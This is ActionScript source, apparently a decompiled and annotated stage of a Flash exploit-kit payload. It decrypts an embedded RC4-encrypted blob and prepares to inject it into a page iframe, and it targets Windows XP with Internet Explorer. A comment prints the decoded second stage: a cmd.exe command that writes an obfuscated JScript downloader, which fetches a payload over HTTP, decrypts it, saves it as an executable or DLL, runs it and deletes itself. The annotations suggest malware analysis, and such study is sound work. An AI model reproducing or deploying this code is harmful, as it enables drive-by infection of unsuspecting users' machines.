package package_1
{
   import flash.system.Capabilities;
   import flash.utils.ByteArray;
   import package_0.class_2;
   import flash.external.ExternalInterface;
   
   public final class class_6
   {
       
      private var var_1:Object;
      
      private var var_2:Object;
      
      private var var_4:Class;
      
      private var var_8:String;
      
	  // Function creates an iframe and fills with code
	  // Starts by decoding the binary data in class_12
      public function class_6(param1:Object, param2:Object)
      {
         //debug
		 //var_4 = class_12;
         super();
         this.var_2 = param1;
         this.var_1 = param2;
		 //debug
         //if(false === this.method_1())
         //{
            //return;
         //}
         this.var_8 = "npyftmj31685";
		 //debug
         //var _loc5_:ByteArray = new var_4() as ByteArray;
		 var _loc5_:ByteArray = Main.toArray("79C68931F8C1737E7EFD76F5571E26D3B3E642FE1E010E733B4AA9809AF68BAECDCF8F4E4DFC220741C7467FC06D3427F04A042743950386F1708545D71CFC8E501ED90AD77855A77F33C8269C59EBE569EE50715C5AFF9BE4C4593343977DDF934BB7D99CF8273352F9696AF7753C895B9DEBBB66A5249E89C95CB098DC2BF6861245DA96CE8FB3CD1D2F822A978EADC7888250D6A406D1059F55925744EC977718F43092695AB08817921BF40464665C67F4C74A7316C4B132553283E207401E793936BBD27E1DEE68C205FDE60A672527DC5FF3AD3D17F43643DC7AC51F6A652284E7E740C86816D47522EB818E1BDC2DC16A530B775AC501BED520728E52041FF638A01D3ED586DC674121C78A19C2C4D8BC13D92D466FE4841F3983F0B943EB52632EC3609326019621E0EFB433319AF578FBEC77523977AE109F71AF01550F6E6FCF70B1E95DFFAC6896A264B42FB6A3F54D003205949158E0001FE6139D0B497C3BB4A207F21C0AAA18017FFB946B817F592B5BBC6DD7B8FB7F47EEAE66FCB04A6480710A0B172CE38E71E8017EB34D5EA94E05F934F045F3528F6D5E1CF12E319A550ED9669629E0513255E105E81D9768FDD1B5CF9BC92F9914B58D32F4A3294B2745466B2F3A4D3DA21B147597C5CA25E495896877272BEAEB0D60F91514C49F3D88152ADF27C94B19D81B887B29CE2E304CD06FFF8FA834CFE4740D2FF3CB8EEE8508C89FC3BF86A53CC35AEB828267F723852A0175FDC3D0CE0E2F24563C80153A40D1D1ABEB0C1EDA22EDE8314C744F1976DDFC33574FE554F030FC412D20F06E6D5B8AA67695AFBD6AADCFE26555B5AB6C536B2F081E60C4DDE2A21D4123EFB54A1320AC747C436C1EA5C6C29598645E8DED49B42F2491BE483619D98DFA79FDA9094046A9F54FEC33B50548CF808AADC630429CBB16DCFE2B8EE1AFB9B85D783C3E77AC177FF149B265FB14F5D84B5631F5BD4781461DE2C495B78DDDDE9E2271F4C85C68A076C5D87845D0D338317177674625C058AC396E3039E548CFDA39476F6733DED2D39DEC6F906B8C8D9F62D087811BB964146DB0AB3760F3DE00F1A88914E580096CAD6ADD2F42CEC2ECC3CB5AE534FF2FC8B92D9978193D5347087862965E3A8EDB37E90F32AE4EF969BCB23568E66114F38EA8B9EEBA3B1A8A44CA8A1D55245D04FE67424BA0453F649159F58B3065EC6E74702CDE5928736781BB024F6BE70E84747B52C97421659C6D95AFB04F95339859D411EF833E3B6C7167FD539BF179C1DA8F285457D037EF2577F502ED40DC18C091CDD31BE06469B575DF99CCCDA353914736691D825905D8B310A8A30D77EA115B890B44F86B765C53F2F9442EDA71DBE5302C3B007F9BCB2969810FCD60B1BC71BED51F970469A3E6FBA8DB0BBBA0FC008CAE935948C661EFDA659DD0CE362ABF31C159E5CE636BAD33FEEF2501AB983AF14550DC3C2A994E0A9B78E067BC01DA0A6DB432A02353E313C8286F69E9BC72B89AF27BF383A1F3396E2E9623DFB8EDF166AEBB8485509AAFD6EE128682AAF53C523D86C1A46D303A741EC8CF2532ACEABF9EE1AF0E22C2C658993AAE7149419329344710F1EAB9AEF6B3BC8588AECB5BB510E3C3E328E0383CEDB24382FA849F66B1ED7975CFA678EE16CA0969692D54E46040EFD40DB642D4B6D20EDE1135D368C3D04B559BCF0498D755EB427EA662C60F29B564E32816F4BB629CC467777F220D16443A2B51A207FAA560D1EF8775DDB7E4F8A009902BDA7A66D3F76A469C28A6A049DCF592D1C97219B6E3B7000BFD1ADDEC70F5AD1A5A58933FA693B8C84AC064AA5E8C01FC967AAD81C5CBFCA5AB2C7342ACB9CCAEC959B4D15EA6FC9AA462E166854BEFF63CCDCC24CB41D49E6910109E880172DA222A4BE3D398D657174388DC766B68AB67C6ACA8452BA13A0F49424EE52F3CA207A64C51935E50A15AFDF1BE3CE44BEA4F75739EA8925157740EEF2C1E23422006ECBC18F2EC730A4882246B7C12D7E45E182C42225861BD22C0BD06EE781B86D704119486566D18950306B89C7BE4740806ADA465B5F3E0D71A5FC6B81FD3F8BD597CCD578D40A0A9BBBD2C1F5EE6CCEA5290C3DA114F4A627DF38E64DFB60966B4619141B2D9A1B47E2032BF852368810E8117E56DB20D552ED3C5F1DC4993A6E7F46A9CD1259C98FBF23223E48CEEFF02CF7FF92CD107814CCA4590D93159C79EEBA41EA9558CF6ECF6F53BA2308111F857D0F3A1B157AAE519D659E74949D10A430A409272D0ACD9BEB17CEF9DE59573689B7F08CCC6F646A930B897103F89C9210CB4C0483C7E9948A774FB0CC5D0C4DF526D85F68C2329128F2C3B417102DD5989A20FB6EA415F5081652B9B2A52A432BE5F1445F812493C7B6D781774BCE3B7C38C00C3107E0D7E63933E840C7FAEAAFC1558BD6791CF669B5E9FE74B234877DDFF32EA660E0BD44AFDDE9F07888AC6BE6828386A678008034855C5F1E113EC9BB2027EF16FF4C02EA1D81A4D341C14DC27AF4B788B408BC2E73F4959B4953FA6DEA14DB2AF8D0232EF63645904C81CFCE00D7583A39DA72BCC1DA7D9450E33871C6ED7A15799B82B2368C3115F26BDD8A2C7EB99BE49C55CBA42925642FB50C34C9D4E09A426CF306A927139719300CD601D75DF3EDEF0667B079B64C04E9E07916B7548D4DB1C96F4132F40D5B25259F98E5038EE4BFC6E4AF1083BC11C54FA30308736B4C77A3A82E9145276867D9251C46C3B10164E015C03D9E1094A0F75464EA67A43202023FF2A52C564CC02D7C3186F4E991FED177545AC5F6AF39EAEA63DD38F05B14B3765DE51A31A1D4D3CCB69FF3ACDE7EA3E9DCB4FCD8B5A899AA6C9C829F8AB1C893FA4FC28FF904D5F37045EE4C87D91353EFFC6B123C267F78E598A3B5287BF9083745CCD2E477440E907D74A07968034113B48830CFC1C0B5C42371DA7196B630F55BB5DA6ABD26DB32FF99EA2F6541C85CE96E958698D82CB92C032F98F99B4334A55163A4AC177B38A704C44067F471A2A7DB85FB40499FC7BA9C6DEB9BF9D5148AEEA5FDA2010E6A90E48CB805540E0CE213FA4C019D8D7634E7B159F02017F20D63986DF9A49C3C3BE67A4271D18F9C4F3D6E569263ED202BC495E147CCECC75C51EA38873FB681156173C584FE434D6213130044BABDFE279C553DE157F4D5E8105A11AC828FE4FBC0EDBCB38163DFF1C71CE4E2984B08D0D3245859E8359A09C4D6AA1F6CC0EB477D5");
         _loc5_ = class_2.method_2(_loc5_,this.var_8);
         _loc5_.uncompress("deflate");
         var _loc3_:String = _loc5_.toString();
         var _loc4_:String = "var iframe  = document.createElement(\'iframe\');iframe.style.width  = \'50px\';iframe.style.height = \'50px\';document.body.appendChild(iframe);iframe.contentWindow.contents = unescape(\'%embedHtml%\');iframe.src = \'javascript:window.contents\';";
         _loc3_ = _loc3_.replace("%payloadUrl%",this.var_2.link.pnw25);
         _loc3_ = _loc3_.replace("%payloadRc4Key%", this.var_2.key.payload);
		 //debug
		 trace(_loc3_);
	 /* Once escaped, we get the following:
		  * cmd.exe /q /c cd /d "%tmp%" && echo function Log(n,g){
		  * for(var c=0,s=String,d,D="\x70us\x68",b=[],i=[],r=0377,a=0;r+1^>a;a++)
		  * b[a]=a;for(a=0;r+1^>a;a++)c=c+b[a]+g[v](a%g.length)^&r,d=b[a],b[a]=b[c],
		  * b[c]=d;for(var e=c=a=0,S="fromCharCode";e^<n.length;e++)a=a+1^&r,
		  * c=c+b[a]^&r,d=b[a],b[a]=b[c],b[c]=d,i[D](s[S](n[v](e)^^b[b[a]+b[c]^&r]));
		  * return i[u(15)](u(11))};function H(g){var T=u(0),d=W(T+"."+T+u(1));
		  * d["\x73et\x50ro\x78y"](n);d.open(u(2),g(1),n);d.Option(0)=g(2);
		  * d["\x53en\x64"];if(0310==d.status)
		  * return Log(d["res\x70o\x6e\x73e\x54ext"],g(n))};
		  * E="WinHTTPMRequest.5.1MGETMScripting.FileSystemObjectMWScript.Shel"+"lMADODB.StreamMeroM.ex",
		  * u=function(x){return E.split("\x4d")[x]},J=ActiveXObject,
		  * W=function(v){return new J(v)};try{
		  * E+="eMGetTe"+"mpNameMcharCodeAtMiso-8859-1MMindexO"+"fM.d"+"llMScr"+"iptF"+"ullNa"+"
		  * meMjo"+"inMr"+"unM /c M /s ";var q=W(u(3)),j=W(u(4)),s=W(u(5)),p=u(7),n=0,
		  * L=WScript[u(14)],v=u(9),m=WScript.Arguments;s.Type=2;c=q[u(8)]();s.Charset=u(012);
		  * s.Open();i=H(m);d=i[v](i[u(12)]("P\x45\x00\x00")+027);s.writetext(i);if(037^<d){
		  * var z=1;c+=u(13)}else c+=p;s.savetofile(c,2);s.Close();z^&^&(c="\x72eg\x73vr3\x32"
		  * +p+u(18)+c);j[u(16)]("cm\x64"+p+u(17)+c,0)}catch(Y){}q["De\x6cet\x65\x66ile"](L);>
		  * Inj6sFosp && start wscript //B //E:JScript Inj6sFosp "
		  */
         //_loc4_ = _loc4_.replace("%embedHtml%",escape(_loc3_));
         //ExternalInterface.call("function (){" + _loc4_ + "}");
      }
      
	  // Function checks to see if environment includes Windows XP or IE
	  // http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/system/Capabilities.html
      public final function method_1() : Boolean
      {
         if("Windows XP" !== Capabilities.os)
         {
            return false;
         }
         if(false === this.var_1.isIe)
         {
            return false;
         }
         return true;
      }
   }
}
